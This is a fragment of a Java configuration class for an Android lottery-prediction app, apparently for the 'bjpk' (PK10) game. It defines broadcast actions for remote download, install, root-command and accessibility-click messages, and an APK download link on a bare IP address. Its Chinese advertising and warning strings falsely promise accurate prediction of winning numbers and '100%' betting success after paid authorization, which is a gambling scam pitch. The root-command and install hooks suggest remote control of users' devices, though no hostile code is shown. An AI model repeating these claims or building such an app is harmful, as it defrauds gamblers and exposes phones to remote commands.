...
public class ConfigCt {
	...
	public static final String appID="av";//定义app标识：
    //服务器IP
    ...
    public static final String ACTION_DOWNLOAD_INFO = "com.byc.bjpk.DOWNLOAD_INFO ";//下载消息
    public static final String ACTION_INSTALL_INFO = "com.byc.bjpk.INSTALL_INFO ";//安装消息
    public static final String ACTION_CMD_INFO = "com.byc.bjpk.CMD_INFO ";//root命令消息
    public static final String ACTION_UPDATE_INFO = "com.byc.UPDATE_INFO ";//更新消息
    public static final String ACTION_ACCESSBILITY_SERVICE_CLICK = "com.byc.bjpk.ACCESSBILITY_SERVICE_CLICK";//点击广播；
    ...
    //服务器信息：
    public static final String FTP_FILE_NAME="bjpk.xml";//服务器上文件名；
    ...
    public static String ad="准确预测开奖数字！稳定赢！可试用。";//广告语
    private static final String INFO_DOWNLOAD="Info_Download";//--
    public static String download="http://119.23.68.205/android/bjpk.apk";//下载地址
    ...
    public static String warning="警告：未授权用户预测投注部分功能受限！授权后成为正版100%预测投注成功！准确预测开奖数字！";//下载地址   
